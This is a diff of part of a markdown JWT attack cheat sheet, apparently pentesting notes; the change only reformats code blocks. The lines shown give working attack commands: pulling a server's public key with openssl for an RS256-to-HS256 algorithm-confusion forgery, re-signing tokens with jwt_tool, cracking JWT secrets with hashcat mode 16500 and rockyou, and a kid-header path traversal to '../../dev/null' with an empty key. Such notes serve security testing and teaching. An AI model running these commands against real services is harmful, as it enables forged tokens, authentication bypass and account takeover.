@@ -37,18 +37,19 @@
 
 ## Change Algorithm from RS256 to HS256:
 - Get the Public key from the application (e.g., pubkey.pem file) using the following commands:
-```openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
-openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem```    
+`openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem`
+`openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem`    
 
 or 
-```oopenssl s_client -connect zonksec.com:443 | openssl x509 -pubkey -noout````
+`oopenssl s_client -connect zonksec.com:443 | openssl x509 -pubkey -noout`
 
 commnad: `python3 jwt_tool.py <JWT> -S hs256 -k pubkey.pem`
 
 
 ## Crack the Secret Key:
-```hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --force
-hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --show   # to display the cracked secret key```
+`hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --force`
+
+`hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --show   # to display the cracked secret key`
 
 ## Attacks Using kid in JWT Token
 `python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""`
